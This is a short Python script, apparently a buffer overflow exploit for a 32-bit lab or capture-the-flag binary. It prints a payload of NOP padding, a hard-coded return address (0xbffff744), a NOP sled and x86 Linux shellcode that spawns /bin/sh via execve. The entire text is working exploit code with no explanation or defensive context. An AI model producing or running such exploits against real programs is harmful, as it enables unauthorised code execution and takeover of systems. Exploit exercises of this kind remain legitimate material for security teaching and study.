import struct

nop = b"\x90"*(76)
eip = struct.pack('I', 0xbffff744)
pad = b"\x90"*10
payload = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

print(nop+eip+pad+payload)
